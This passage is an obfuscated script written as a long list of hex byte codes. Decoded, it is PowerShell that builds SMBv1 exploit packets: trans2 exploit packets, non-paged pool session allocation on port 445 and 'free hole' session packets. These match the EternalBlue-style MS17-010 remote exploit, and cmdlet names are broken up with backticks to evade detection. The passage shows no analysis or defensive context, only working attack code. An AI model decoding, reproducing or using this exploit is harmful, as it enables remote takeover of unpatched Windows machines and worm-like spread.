, '6b' ,74,20 ,'2b', '3d', 20 , 30, 78 , 30, 31, '2c',30,78,34,38, 'd', 'a',24 , 70, '6b' ,74 , 20 ,'2b', '3d' ,20,30,78 , 30,30,'2c', 30, 78 , 30,30 , 'd' ,'a' , 24 , 70,'6b',74 , 20 ,'2b','3d' ,20 , 30 , 78 , 30, 30,'2c' ,30 ,78 , 30,30,'2c' ,30 ,78,30 ,30, '2c' ,30,78 ,30 , 30, 'd' , 'a', 24 ,70 , '6b',74,20 ,'2b', '3d' , 20 , 30,78 , 30, 30, '2c',30,78,30 , 30, '2c', 30 ,78, 30, 30 ,'2c',30,78,30 ,30,'d','a',24 , 70,'6b', 74,20, '2b' , '3d', 20 , 30 , 78 , 30, 30 ,'2c',30 ,78,30,30,'d', 'a' , 24,70,'6b' , 74 ,20, '2b' , '3d', 20, 24 ,74 ,72, 65, 65,'5f',69,64 ,'d', 'a' ,24 ,70 , '6b',74, 20 ,'2b' , '3d', 20 ,30 , 78 ,32, 66, '2c', 30,78 ,34 ,62, 'd','a',24 ,70 ,'6b' , 74, 20 , '2b','3d',20 ,24,75,73, 65, 72,'5f' , 69, 64 , 'd' , 'a' , 24 , 70 ,'6b',74 , 20, '2b', '3d' ,20, 30, 78 , 30 , 30,'2c' , 30 ,78 ,30,30 , 'd', 'a' ,24 ,70,'6b' ,74 ,20,'2b', '3d',20 , 30, 78 , 31 ,34 , 'd', 'a' , 24 ,70, '6b' , 74, 20,'2b','3d' , 20 , 30,78,30 ,31,'d' ,'a' , 24 , 70, '6b', 74 ,20, '2b' ,'3d',20, 30,78, 30 , 30, '2c' , 30 , 78, 30, 30,'d' , 'a', 24,70, '6b',74, 20, '2b' ,'3d' , 20 , 30 , 78 ,31 ,65 ,'2c',30 ,78 , 30 , 30,'2c' , 30 , 78 , 30,30 , '2c',30, 78,30, 30,'d','a',24 , 70 ,'6b' ,74 , 20 ,'2b' , '3d',20,30 , 78 , 31, 36,'2c',30,78 , 30 , 30,'2c' , 30, 78 , 30,31, '2c' , 30,78 , 30 ,30,'d','a' ,24, 70,'6b' ,74,20, '2b', '3d', 20,30, 78, 31,65 , '2c', 30 ,78,30, 30,'2c',30, 78,30, 30 , '2c', 30,78 ,30, 30, 'd' , 'a',24 ,70 ,'6b',74 , 20, '2b' ,'3d' ,20 , 30,78, 30, 30, '2c' , 30,78,30,30,'2c' , 30 ,78 ,30,30, '2c', 30 ,78 , 30 ,30 ,'d', 'a' , 24, 70,'6b' ,74 , 20,'2b','3d', 20,30,78 ,31 ,65,'2c', 30,78 ,30 , 30 ,'2c',30 , 78 ,30 ,30, '2c',30, 78,30,30 , 'd', 'a',24 ,70 ,'6b', 74 ,20 ,'2b', '3d',20 , 30 ,78 , 34 , 63 , '2c' ,30,78 ,30 , 30 , '2c' ,30 ,78,30,30 , '2c' ,30, 78 ,30 ,30, 'd', 'a', 24, 70 ,'6b' ,74, 20 ,'2b' ,'3d' ,20 , 30 ,78 ,64 ,30 , '2c',30, 78,30,37 ,'2c', 30 , 78 , 30 , 30 , '2c',30,78 ,30, 30, 'd' , 'a',24 , 70,'6b', 74,20, '2b' , '3d', 20 ,30,78,36,63 , '2c',30 , 78,30, 30 , '2c' , 30 ,78 , 30, 30, '2c',30, 78 ,30,30 , 'd','a',24 , 70, '6b' ,74 , 20 ,'2b' , '3d',20, 30 ,78,30 , 31,'d','a',24, 70 ,'6b',74,20,'2b','3d' , 20 ,30,78,30 , 30, '2c', 30, 78 , 30 , 30 , 'd','a',24 , 70,'6b',74, 20,'2b','3d', 20 , 30,78 , 30, 30, '2c' , 30 , 78,30 , 30,'d' , 'a', 24,70 ,'6b' ,74 , 20 ,'2b' ,'3d' , 20 , 30 ,78 , 66, 31,'2c', 30 ,78,30, 37,'d' , 'a',24,70 ,'6b' , 74 , 20,'2b','3d' , 20,30, 78,66,66 , 'd','a', 24, 70 , '6b', 74 , 20, '2b','3d', 20,'5b',42 , 79,74 , 65,'5b' , '5d', '5d',20 ,28 ,30,78 , 30 ,30 , 29,20,'2a' , 20, 30, 78 , 31, 65,'d', 'a',24, 70,'6b' ,74 , 20 , '2b' , '3d' , 20,30, 78 , 66, 66 , '2c' , 30, 78 ,66, 66,'2c' ,30 ,78, 30 ,30 , '2c', 30 ,78 ,30 ,30,'2c',30,78, 30, 31 ,'d' , 'a' ,24, 70 , '6b', 74,20, '2b' , '3d' ,20,'5b' , 42,79 , 74,65 ,'5b', '5d', '5d' , 28,30 , 78 , 30,30, 29 , 20 , '2a', 20,30 , 78 , 37, 43 ,44 , 'd' ,'a', 72,65 ,74, 75 , 72 , '6e' , 20 , 24, 70,'6b' ,74, 'd' ,'a' , '7d','d', 'a',66, 75, '6e', 63,74,69,'6f' ,'6e' , 20, '6d' , 61,'6b',65 ,'5f' ,73, '6d',62,31,'5f', 74, 72 , 61 , '6e' ,73, 32 , '5f', 65 ,78 , 70 , '6c','6f' ,69 , 74,'5f',70 , 61 , 63 ,'6b',65,74,28,24 , 74,72,65 ,65 , '5f' , 69,64, '2c',20,24 ,75 ,73 ,65 , 72 ,'5f' , 69, 64, '2c' , 20 ,24, 64 ,61 , 74 ,61 ,'2c' ,20,24 ,74 ,69 , '6d' ,65, '6f',75 ,74 , 29 , 20,'7b', 'd', 'a' ,24 ,74 , 69, '6d', 65, '6f', 75,74,20 , '3d' ,20,28 , 24,74,69 ,'6d', 65 ,'6f',75, 74 , 20 ,'2a',20 ,30 , 78 ,31,30 , 29 ,20 ,'2b',20 ,37, 'd','a','5b' , 42,79,74,65,'5b' , '5d', '5d',20, 24,70, '6b' , 74 , 20, '3d' , 20 ,'5b' ,42 ,79 , 74 ,65 ,'5b','5d' , '5d' , 20, 28, 30, 78,30 , 30, 29 ,'d' ,'a', 24 ,70,'6b' ,74,20 , '2b' ,'3d', 20 , 30, 78, 30,30 ,'2c',30,78,31,30,'2c' , 30 ,78, 33 , 38,'d' ,'a', 24,70,'6b', 74,20 ,'2b', '3d' , 20, 30 , 78,66, 66, '2c' , 30 ,78,35 ,33 ,'2c',30,78, 34,44 ,'2c', 30 ,78 , 34 ,32 ,'d' , 'a' ,24,70 ,'6b',74, 20, '2b' , '3d' ,20,30, 78 , 33, 33, 'd' , 'a', 24, 70,'6b' ,74 , 20 , '2b', '3d',20 ,30 , 78, 30 , 30 , '2c',30 ,78,30, 30 ,'2c' , 30 , 78,30 , 30 ,'2c' , 30,78 ,30 , 30,'d' , 'a' , 24 , 70,'6b' , 74 , 20 ,'2b','3d', 20 , 30,78 ,31 ,38 , 'd','a', 24 , 70 ,'6b', 74 , 20, '2b' , '3d',20,30 , 78 , 30 ,31, '2c' , 30,78,34, 38 , 'd', 'a' ,24 ,70, '6b',74, 20, '2b' , '3d' ,20,30, 78,30 ,30, '2c', 30, 78,30, 30,'d', 'a' , 24 , 70, '6b', 74 , 20 , '2b', '3d' , 20 , 30, 78, 30 ,30 , '2c' , 30 ,78,30 , 30,'2c',30 ,78 , 30, 30,'2c',30,78 , 30 ,30 ,'d', 'a' ,24,70 ,'6b',74,20, '2b', '3d', 20 ,30 ,78 ,30 , 30, '2c' , 30, 78,30,30 , '2c' , 30,78, 30 ,30 , '2c',30,78, 30 , 30 , 'd' , 'a' ,24 ,70,'6b' , 74 ,20, '2b' ,'3d',20, 30 ,78 ,30, 30 ,'2c' ,30 , 78 , 30,30, 'd' , 'a' ,24, 70,'6b' ,74,20 , '2b','3d', 20,24,74, 72, 65 , 65,'5f' ,69 ,64,'d', 'a',24 ,70 ,'6b', 74, 20, '2b','3d' ,20 , 30 , 78,32, 66, '2c',30 , 78,34, 62 ,'d', 'a',24 , 70,'6b' , 74,20, '2b','3d',20,24 , 75,73 ,65, 72 ,'5f' ,69,64 , 'd','a',24 ,70, '6b' , 74, 20,'2b' ,'3d',20, 30 , 78, 30,30 ,'2c',30, 78 ,30 , 30, 'd' , 'a' ,24 ,70,'6b' ,74, 20,'2b','3d',20 ,30, 78,30 ,39 , 'd' ,'a',24, 70 , '6b', 74 , 20 , '2b', '3d',20 ,30, 78 ,30, 30,'2c', 30 , 78 , 30 , 30 , 'd','a' ,24 , 70, '6b',74,20, '2b' ,'3d', 20 ,30, 78,30 ,30,'2c' ,30 ,78,31, 30 ,'d', 'a' ,24 , 70,'6b', 74, 20 ,'2b' , '3d' , 20 ,30,78 ,30 ,30 ,'2c',30 ,78 , 30, 30, 'd' , 'a',24 , 70, '6b', 74 , 20 ,'2b' ,'3d' ,20 ,30, 78 , 30 , 30 ,'2c',30, 78,30 , 30,'d' ,'a',24, 70 ,'6b',74, 20,'2b' , '3d', 20, 30 , 78 , 30,30 , 'd' ,'a',24 ,70, '6b',74, 20 , '2b', '3d' ,20 , 30 ,78, 30, 30 ,'d' ,'a' ,24, 70 ,'6b' ,74 ,20,'2b','3d' ,20 , 30,78, 30 ,30, '2c' , 30 ,78 ,31, 30 ,'d', 'a',24 ,70 ,'6b' ,74 , 20, '2b', '3d',20 , 30,78 , 33 ,38,'2c',30,78, 30 , 30 ,'2c' , 30, 78, 64 ,30,'d','a', 24 , 70, '6b' ,74 , 20 , '2b', '3d' ,20 ,'5b',62 , 69,74, 63, '6f', '6e', 76 , 65, 72 ,74, 65 ,72 ,'5d','3a','3a', 47,65,74 ,42,79,74,65 ,73,28, 24 ,74,69 , '6d', 65, '6f', 75 ,74, 29 ,'5b',30 , '5d' ,'d' , 'a' , 24 ,70, '6b', 74, 20 ,'2b' , '3d', 20, 30 ,78 ,30 , 30 ,'2c',30 ,78 ,30 , 30, 'd', 'a',24 , 70 ,'6b' ,74,20,'2b' , '3d',20 ,30 , 78, 30, 33 ,'2c' ,30 ,78 ,31 , 30 , 'd' ,'a' ,24 ,70 ,'6b', 74,20,'2b', '3d' , 20,30,78 , 66, 66 , '2c', 30 , 78 , 66 ,66 ,'2c',30 , 78 ,66 , 66 ,'d' , 'a' , 24, 70 ,'6b', 74 ,20 , '2b','3d' ,24 ,64, 61 , 74 , 61, 'd' , 'a' ,24, '6c', 65, '6e' , 20,'3d' , 20 , 24 , 70,'6b',74 ,'2e','4c' , 65 , '6e', 67,74, 68 , 20,'2d',20 ,34 ,'d' ,'a', 24,68,65 , 78, '6c' ,65 ,'6e' ,20,'3d' , 20,'5b',62 , 69 ,74 ,63,'6f', '6e',76,65,72,74, 65 , 72, '5d' ,'3a' , '3a' ,47 ,65 , 74 , 42 ,79 ,74 , 65 ,73 ,28, 24 , '6c',65 , '6e' ,29 , '5b', '2d' , 32 ,'2e', '2e','2d' , 34, '5d', 'd' , 'a', 24 ,70 , '6b' , 74,'5b',31,'5d', 20, '3d' , 20, 24, 68,65, 78,'6c' , 65 ,'6e', '5b' ,30, '5d' , 'd' ,'a' ,24 , 70, '6b', 74 , '5b' ,32 ,'5d' , 20,'3d', 20 ,24 ,68 ,65 ,78 , '6c', 65, '6e','5b' ,31,'5d','d','a' ,24,70,'6b' ,74, '5b', 33, '5d',20, '3d' ,20,24 , 68 ,65 , 78, '6c' , 65,'6e','5b', 32 ,'5d' ,'d' ,'a',72, 65, 74 ,75,72 ,'6e' , 20 , 24 , 70 , '6b' ,74 ,'d', 'a', '7d' ,'d', 'a' , 66 , 75, '6e',63 ,74 ,69 , '6f' , '6e' ,20, '6d',61,'6b',65 , '5f' ,73 ,'6d' ,62, 31,'5f' ,74 , 72, 61 , '6e' , 73 ,32 ,'5f' , '6c', 61 ,73, 74 , '5f',70 , 61, 63,'6b',65 , 74,28,24 ,74, 72 ,65, 65 , '5f' , 69 , 64 ,'2c' , 20 ,24 ,75 , 73 , 65 ,72 , '5f' ,69 , 64,'2c',20, 24, 64 , 61 , 74 , 61,'2c' ,20 ,24 , 74, 69,'6d' , 65, '6f' ,75 ,74 ,29, 20, '7b', 'd' , 'a',24,74 , 69, '6d', 65,'6f',75 , 74, 20,'3d',20 ,28,24,74, 69, '6d', 65, '6f',75, 74 , 20 , '2a',20 , 30 ,78 , 31, 30 , 29 , 20, '2b' ,20 ,37 , 'd','a','5b',42,79 ,74,65 , '5b', '5d', '5d' ,20, 24,70,'6b' , 74 , 20, '3d' , 20 , '5b' ,42 , 79 ,74 ,65,'5b', '5d' , '5d',20 ,28,30 , 78,30 ,30 , 29 ,'d' , 'a' , 24 , 70, '6b' ,74 ,20,'2b' ,'3d', 20 , 30,78 ,30,30, '2c', 30,78,30, 38,'2c', 30, 78,37 ,65 ,'d', 'a', 24 ,70 , '6b' , 74 , 20,'2b','3d',20 ,30 ,78,66 , 66 , '2c' , 30,78 ,35 ,33 ,'2c', 30, 78 , 34, 44 ,'2c' , 30 ,78 ,34 , 32, 'd', 'a' , 24 ,70,'6b' ,74 , 20, '2b' ,'3d', 20 , 30 ,78, 33, 33, 'd' , 'a' , 24 , 70 ,'6b' ,74,20, '2b' , '3d',20, 30 ,78,30 , 30, '2c' ,30 , 78, 30, 30, '2c', 30 ,78,30, 30 ,'2c', 30,78 , 30,30,'d' , 'a', 24, 70,'6b' , 74, 20, '2b' , '3d', 20 , 30 , 78,31,38,'d', 'a', 24 ,70, '6b',74,20,'2b','3d', 20 , 30 ,78 ,30,31 , '2c',30, 78, 34, 38, 'd' , 'a',24 , 70,'6b' , 74 , 20, '2b' , '3d' , 20 , 30, 78 , 30 , 30 ,'2c' , 30 , 78 , 30 ,30,'d', 'a' , 24 ,70, '6b', 74 , 20 , '2b','3d', 20, 30, 78 ,30 ,30 ,'2c', 30 , 78 , 30, 30,'2c' , 30, 78 , 30, 30, '2c', 30 , 78,30 ,30, 'd' , 'a',24 , 70, '6b', 74,20,'2b' ,'3d' , 20 , 30, 78, 30 ,30,'2c' , 30,78,30,30,'2c', 30,78 ,30 , 30 ,'2c' , 30 ,78 , 30,30,'d', 'a' , 24,70 ,'6b',74, 20,'2b' ,'3d' , 20, 30,78 , 30 ,30 ,'2c',30, 78,30, 30,'d', 'a',24 , 70 ,'6b' ,74, 20 , '2b' , '3d' , 20,24 , 74, 72 ,65 ,65,'5f' ,69,64 ,'d' ,'a',24 ,70 , '6b' , 74 , 20,'2b' ,'3d' , 20, 30, 78, 32 ,66 ,'2c' ,30, 78 ,34 ,62, 'd' , 'a',24 ,70, '6b', 74 , 20, '2b' ,'3d', 20, 24 ,75, 73 ,65 , 72 , '5f' , 69, 64 ,'d', 'a' , 24, 70 , '6b' ,74 , 20 ,'2b', '3d' , 20,30 , 78,30 ,30 , '2c' ,30, 78 ,30, 30 ,'d' , 'a' ,24,70,'6b' , 74 , 20 ,'2b','3d' , 20,30,78, 30,39, 'd' , 'a' ,24, 70, '6b' , 74 , 20 ,'2b','3d' ,20 , 30 , 78 , 30 ,30 , '2c' , 30 , 78, 30 , 30 , 'd' ,'a' , 24,70, '6b',74,20 ,'2b', '3d' , 20, 30 ,78 , 34,36,'2c' , 30,78 , 30 ,38,'d', 'a', 24, 70,'6b' , 74, 20, '2b','3d' , 20 , 30 ,78, 30 , 30, '2c',30 ,78 , 30 , 30,'d','a',24 ,70 ,'6b' , 74, 20 ,'2b' ,'3d' ,20 , 30, 78 ,30 , 30, '2c', 30 ,78 , 30 , 30 , 'd', 'a', 24 ,70 ,'6b',74, 20,'2b','3d', 20,30 , 78,30, 30,'d','a' ,24,70, '6b', 74, 20 ,'2b','3d', 20, 30 , 78 , 30 ,30,'d' ,'a',24, 70, '6b',74 ,20 , '2b' ,'3d' ,20, 30 ,78 , 34 , 36 , '2c',30, 78, 30,38 , 'd' ,'a', 24 ,70 ,'6b',74,20, '2b','3d' ,20,30 , 78 , 33 ,38, '2c' ,30, 78, 30 , 30 ,'2c',30, 78,64, 30 , 'd','a' ,24,70 ,'6b' , 74,20 ,'2b', '3d', 20 , '5b' , 62, 69 ,74 ,63,'6f' , '6e' , 76, 65,72 , 74,65 ,72 , '5d','3a' , '3a',47 , 65 , 74 ,42 , 79,74,65 ,73,28, 24,74 ,69 ,'6d' , 65 ,'6f',75,74 ,29,'5b', 30,'5d', 'd' ,'a',24, 70 ,'6b' , 74 , 20,'2b' , '3d',20 ,30,78 ,30,30, '2c', 30,78 ,30,30 ,'d', 'a',24,70 ,'6b', 74 ,20 ,'2b','3d', 20 ,30, 78 ,34,39 ,'2c' , 30 , 78,30 , 38,'d', 'a',24 , 70,'6b' ,74 , 20, '2b','3d' , 20,30, 78,66 , 66 , '2c', 30, 78, 66, 66,'2c' , 30, 78, 66,66, 'd', 'a' , 24,70 ,'6b', 74,20 ,'2b' , '3d', 24 ,64 ,61 , 74 , 61,'d','a' , 24,'6c' ,65,'6e' , 20 ,'3d' ,20, 24 , 70,'6b' , 74 ,'2e' ,'4c', 65 , '6e' ,67 , 74,68, 20,'2d', 20, 34 ,'d','a',24 , 68,65 , 78,'6c',65, '6e', 20,'3d' ,20, '5b',62,69 , 74,63,'6f', '6e',76 , 65, 72,74 ,65, 72 , '5d', '3a' ,'3a' ,47,65 , 74, 42 , 79 ,74 ,65,73, 28,24 ,'6c' ,65 , '6e', 29,'5b' , '2d' ,32 ,'2e' ,'2e', '2d',34,'5d' ,'d' , 'a', 24 ,70, '6b' ,74 , '5b', 31,'5d', 20, '3d', 20,24, 68,65 ,78, '6c' , 65 , '6e', '5b' , 30, '5d' , 'd', 'a' , 24,70, '6b' , 74 , '5b' , 32,'5d' , 20,'3d' , 20,24, 68, 65 , 78 ,'6c',65 , '6e' ,'5b', 31,'5d', 'd','a' , 24 ,70 , '6b', 74, '5b' , 33 , '5d' ,20, '3d',20, 24, 68, 65,78, '6c' , 65, '6e','5b' , 32 , '5d' , 'd' ,'a',72, 65,74 , 75 ,72 , '6e', 20 , 24, 70,'6b',74, 'd' , 'a' ,'7d','d', 'a',66,75, '6e' ,63 , 74 ,69,'6f', '6e' ,20, 73,65 , '6e', 64 ,'5f',62,69 ,67 , '5f' , 74, 72 ,61 ,'6e' , 73,32,28 , 24,73, '6f',63 ,'6b','2c' , 20 ,24 ,73,'6d' ,62, 68 , 65, 61,64, 65 ,72, '2c', 20, 24 ,64,61,74,61 , '2c' ,20 , 24,66 ,69, 72, 73 ,74, 44, 61, 74, 61 , 46,72, 61,67,'6d', 65 , '6e' , 74 ,53 , 69, '7a' , 65, '2c',20 ,24 , 73,65 , '6e' ,64, '4c' ,61 , 73, 74, 43, 68 ,75, '6e','6b' ,29 , '7b' ,'d','a',24, '6e' , 74 , '5f' , 74 , 72,61,'6e',73 , '5f',70 , '6b', 74, 20 , '3d',20,'4d' , 61 ,60 ,'4b' ,60, 65 , '5f' ,53, '6d', 62 , 31, '5f' ,'6e' , 60 ,54, '5f' , 60,54, 72 , 41 , '6e', 73,'5f',50,41 , 60,43 , 60 , '4b',45, 54, 20, 24 ,73 ,'6d' , 62,68, 65, 61 ,64, 65,72, '2e', 74 ,72, 65 , 65 ,'5f' ,69 , 64,20 ,24,73 ,'6d' , 62 , 68 , 65 , 61,64 ,65,72, '2e',75, 73 ,65 ,72,'5f' , 69,64, 'd' , 'a', 24,73 ,'6f',63 , '6b','2e' ,53 ,65,'6e',64 , 28 , 24 ,'6e' ,74,'5f', 74 , 72 , 61 ,'6e',73, '5f' ,70 , '6b' , 74, 29 , 20 , '7c' ,20 , '4f', 75, 60 , 54 ,'2d' , 60 ,'4e' ,75 ,'6c', '6c', 'd','a', 24 , 72 ,61 ,77, '2c', 20, 24 , 74 , 72, 61 , '6e' ,73,68 ,65 , 61,64,65, 72 , 20,'3d' ,20,73,'6d', 42, 31 , 60, '5f' ,47 ,45 , 54 , '5f' ,72,60 ,45 , 73,60 , 50 , 60 ,'4f' , 60 ,'4e' ,73,45 ,28, 24 , 73, '6f' ,63 ,'6b' , 29,'d', 'a' ,24 , 69,'3d' ,24 , 66 ,69 ,72,73, 74,44 , 61 , 74,61 , 46 , 72 , 61, 67 , '6d' , 65 , '6e' , 74,53, 69, '7a',65 , 'd' , 'a' , 24 , 74 ,69 ,'6d' ,65,'6f' ,75,74,'3d' ,30 , 'd' , 'a' ,77 , 68 , 69 ,'6c' ,65, 20,28, 24 , 69 ,20, '2d', '6c' ,74 , 20 , 24 ,64, 61 , 74, 61 ,'2e',63, '6f' ,75, '6e' , 74 ,29 ,'d' ,'a' , '7b', 'd','a',24 , 73 ,65 ,'6e' ,64 ,53, 69 , '7a' , 65,'3d', '5b' , 53 , 79 ,73,74 ,65 , '6d', '2e' , '4d',61 ,74,68 , '5d' , '3a','3a' , '4d', 69 ,'6e' , 28 ,34 , 30 ,39 ,36,'2c' , 28 ,24 , 64 ,61 , 74, 61,'2e',63, '6f' ,75, '6e', 74,'2d' ,24 ,69, 29,29, 'd' ,'a', 69 ,66,20 ,28 ,28 , 24, 64 ,61,74, 61 ,'2e', 63 , '6f',75,'6e' , 74, '2d',24 ,69,29 ,20 ,'2d' ,'6c' ,65,20,34 ,30 ,39 , 36 , 29 , '7b' ,'d','a' ,69 ,66 , 20 , 28 , 21 , 24 ,73, 65 ,'6e', 64 ,'4c', 61,73 , 74 ,43, 68,75 ,'6e' ,'6b',29, 'd', 'a','7b',20 , 62 , 72 ,65 ,61, '6b',20 ,'7d' , 'd', 'a' , '7d', 'd' , 'a' , 24 ,74, 72 ,61 ,'6e' , 73 , 32,'5f', 70,'6b',74,20 , '3d' ,20, '6d' , 60,41 , '4b' , 45 ,'5f' , 73, 60 , '4d' ,62 , 31 ,'5f' ,60 , 54, 60 ,52, 41 , '6e',73 ,60,32 , '5f',65,58 , 50 ,'6c', '4f' ,49 , 74,'5f' , 50, 60,41, 43,'6b',45 , 74,20,24 , 73,'6d' ,62 ,68 ,65,61, 64 , 65,72 ,'2e' , 74 ,72,65,65, '5f' , 69 ,64 ,20,24 ,73 , '6d' , 62 , 68 , 65,61 , 64 , 65 ,72 ,'2e',75, 73, 65 , 72 , '5f' , 69 ,64 ,20,24, 64 , 61 ,74,61, '5b' , 24 , 69, '2e' ,'2e', 28,24,69 ,'2b', 24, 73,65 ,'6e',64,53 ,69, '7a' ,65, '2d' , 31, 29,'5d', 20,24,74, 69 , '6d', 65 , '6f' , 75,74, 'd', 'a',24, 73 ,'6f', 63, '6b', '2e' ,53 ,65, '6e', 64, 28,24,74,72 ,61 , '6e' ,73 , 32 , '5f' , 70,'6b' , 74, 29, 20, '7c',20 , '4f',75, 60, 54 ,'2d', 60 , '4e', 55 ,'6c' , '6c','d' , 'a' ,24 , 74 ,69,'6d' ,65 , '6f',75, 74 , '2b' , '3d', 31,'d' , 'a',24, 69, 20,'2b' ,'3d' , 24 ,73 , 65, '6e', 64 ,53 ,69 , '7a', 65 , 'd', 'a','7d', 'd','a' ,69 , 66, 20 ,28 ,24,73, 65 ,'6e',64, '4c' , 61, 73 , 74, 43, 68, 75,'6e' , '6b', 29 ,'d', 'a','7b', 53 ,'4d' , 60 ,42 ,31 ,'5f', 67, 60, 65,74 , 60, '5f' ,52 ,45, 73, 70, '4f', 60,'4e' , 60,73 , 45, 28, 24, 73 ,'6f' ,63, '6b' ,29,20 , '7d' , 'd' ,'a', 72,65 ,74 ,75,72,'6e' , 20, 24,69 , '2c' , 24 , 74,69, '6d',65 , '6f' , 75,74 ,'d' ,'a' , '7d', 'd','a',66,75, '6e' ,63 , 74, 69,'6f' ,'6e' , 20 ,63 ,72 ,65 ,61, 74, 65, 53 ,65 , 73,73 ,69 , '6f' , '6e', 41,'6c','6c' , '6f' ,63 ,'4e','6f' ,'6e' ,50 ,61 ,67, 65,64 ,28,24 ,74,61 , 72 ,67 , 65,74,'2c', 20,24,73, 69 , '7a' ,65 , 29 ,20,'7b' ,'d' ,'a',24, 63 , '6c' ,69,65 , '6e' ,74 , 20,'3d',20, '4e' , 45 ,77,60 ,'2d' ,60 , '6f', 62, '6a', 65 , 43,74,20 ,53,79 , 73,74,65 , '6d' ,'2e','4e' , 65,74, '2e', 53 ,'6f' , 63 ,'6b' , 65,74 ,73 , '2e',54,63 , 70 , 43 ,'6c',69,65 , '6e' , 74 , 28, 24, 74 ,61, 72 , 67 ,65 ,74 ,'2c' , 34 ,34 ,35 , 29,'d' , 'a' ,24,73 , '6f',63, '6b',20, '3d',20, 24 ,63 ,'6c', 69,65 ,'6e',74,'2e' , 43,'6c', 69 ,65 , '6e', 74,'d','a' ,43,'4c' , 49,45 ,'6e', 60, 54,60,'5f' , '4e',65 ,47 , '4f' , 60,54 ,60,69,61, 54, 65, 28 ,24 ,73, '6f',63,'6b' , 29, 20,'7c' , 20,'4f', 55 ,60,54,'2d', '4e',75 ,60 , '4c' ,'6c','d' ,'a', 24 ,66 , '6c',61,67 , 73,32 ,'3d',31,36 ,33,38, 35 ,'d', 'a' ,69 , 66 ,20 , 28, 24 , 73 , 69 ,'7a',65 , 20 , '2d', 67,65,20 , 30, 78,66 , 66,66,66 ,29 ,'d', 'a', '7b' ,20,24 ,72, 65, 71, 73, 69 , '7a' , 65, '3d' ,24,73, 69 ,'7a' , 65, 20,'2f', 32 ,'7d','d', 'a' ,65, '6c' ,73, 65,'d','a','7b','d', 'a' , 24,66,'6c',61 , 67 ,73,32 , 20, '3d', 34, 39, 31,35 , 33 ,'d' , 'a',24,72 , 65, 71, 73, 69,'7a',65 , '3d', 20, 24 , 73 , 69, '7a', 65, 'd' ,'a', '7d' , 'd', 'a' , 69, 66, 28, 24 ,66,'6c',61 ,67, 73 , 32,20, '2d' , 65, 71 , 20, 34,39 , 31 ,35 ,33 ,29 ,20 ,'7b', 'd' ,'a' ,24 ,70 , '6b' ,74,20 , '3d', 20 , '6d', 61 , 60, '4b', 60,65 ,'5f',60, 53, '6d',42 ,60,31 ,'5f' , 46 , 52, 45,65 ,'5f' , 68,'6f' , 60 ,'4c' ,45 , '5f' , 53, 65 ,73, 53 ,69 , '6f' ,'4e', 60 ,'5f' , 50, 60,41, 43 ,'4b', 65 ,74,20 ,28 , 30 , 78 , 30 , 31 , '2c' ,30,78 , 63 , 30,29 , 20 ,28, 30,78,30 ,32 , '2c' , 30 , 78,30, 30, 29, 20, 28 ,30, 78, 66,30,'2c',30, 78 , 66 ,66 ,'2c',30,78 ,30,30 ,'2c' ,30 , 78 ,30, 30 , '2c',30, 78 , 30,30, 29 ,'d' ,'a', '7d', 'd','a', 65,'6c' , 73 , 65 , 20,'7b' ,'d' , 'a', 24, 70, '6b' , 74,20, '3d', 20,'6d',41 ,'6b' ,65,'5f' , 73, '6d' , 62, 31, '5f' , 66 ,52, 45 , 45 , '5f' ,48 ,'6f',60 ,'4c' ,45, 60 , '5f' ,53 , 45,53,53, 60, 49 ,60 , '4f' ,'4e',60,'5f' , 60, 50,61 ,43 , '4b' , 45,74 ,20 ,28 , 30, 78 ,30, 31 ,'2c' ,30 , 78, 34 , 30 ,29, 20,28 ,30, 78 , 30 , 32 , '2c',30, 78 ,30 ,30, 29 , 20, 28, 30 ,78 ,66 , 38, '2c' , 30, 78, 38 ,37 ,'2c' , 30,78, 30 , 30 ,'2c', 30 , 78 ,30,30 , '2c',30,78, 30 ,30 ,29, 'd', 'a' , '7d' , 'd' ,'a' , 24,73 , '6f' , 63, '6b' ,'2e' ,53 ,65 ,'6e', 64 ,28,24 , 70, '6b', 74 , 29,20 , '7c' ,20,'6f' ,55 , 74 , 60, '2d' , '4e', 55, 60 ,'6c','6c' ,'d', 'a',53,60 ,'6d', 60 ,42, 60, 31,'5f' ,47 ,65,60 , 54 ,'5f',52,60,45,53, 70 ,'6f' , '4e' ,53 ,45, 28,24,73,'6f' ,63 ,'6b',29,20, '7c', 20 , '6f', 75 ,60 , 54, '2d', '6e' , 60, 55,'4c' ,'4c', 'd' , 'a' , 72 , 65,74 ,75 , 72,'6e' ,20 ,24 ,73, '6f' ,63, '6b','d', 'a','7d','d' , 'a' ,66 , 75, '6e' , 63 , 74 ,69 , '6f' , '6e',20,'6d',61,'6b' , 65 , '5f', 73, '6d', 62, 31 ,'5f', 66,72,65 , 65 , '5f' ,68, '6f' ,'6c',65,'5f',73,65 ,73, 73 , 69, '6f', '6e', '5f' , 70 , 61,63 , '6b',65 , 74 ,28, 24 , 66 , '6c',61, 67, 73, 32,'2c', 20 ,24, 76,63 ,'6e' , 75, '6d', '2c', 20, 24 ,'6e',61 , 74,69 , 76, 65, '5f' ,'6f' , 73 ,29 , 20,'7b' ,'d' ,'a', '5b' , 42 ,79, 74,65, '5b','5d' ,'5d' , 20,24,70 ,'6b' , 74,20 , '3d',20 , 30 ,78, 30, 30 ,'d', 'a', 24 , 70 , '6b', 74 , 20,'2b','3d', 20,30 , 78,30 ,30, '2c',30 ,78 , 30, 30 ,'2c' , 30 , 78 , 35 ,31, 'd' , 'a',24 , 70, '6b' , 74, 20 ,'2b' ,'3d' , 20,30,78, 66 ,66, '2c' , 30, 78, 35,33 ,'2c', 30,78, 34,44, '2c' ,30 ,78 ,34, 32,'d' , 'a' , 24 , 70,'6b' ,74,20 , '2b','3d', 20, 30 , 78 , 37,33, 'd','a' ,24 ,70 ,'6b', 74 , 20 , '2b','3d', 20 ,30 ,78,30,30 ,'2c', 30 ,78 , 30,30, '2c' ,30 , 78,30 , 30 , '2c' , 30 ,78 ,30,30 ,'d', 'a', 24, 70,'6b' ,74, 20, '2b','3d', 20, 30,78 , 31 ,38,'d','a' ,24,70, '6b' ,74 ,20 ,'2b','3d',20 , 24,66,'6c', 61,67,73 , 32,'d' ,'a' , 24,70 , '6b' ,74,20, '2b', '3d' , 20,30, 78 ,30 ,30 ,'2c', 30, 78, 30, 30 , 'd','a' , 24, 70 ,'6b' , 74 ,20 , '2b' ,'3d', 20 ,30, 78 ,30 ,30 ,'2c' , 30, 78 , 30 ,30, '2c' , 30 , 78, 30,30 , '2c',30 ,78 ,30 , 30,'d' , 'a' , 24 ,70 ,'6b' , 74 ,20, '2b' , '3d' ,20, 30 ,78, 30, 30 ,'2c' ,30, 78,30 , 30, '2c',30,78 , 30 , 30 ,'2c', 30,78, 30 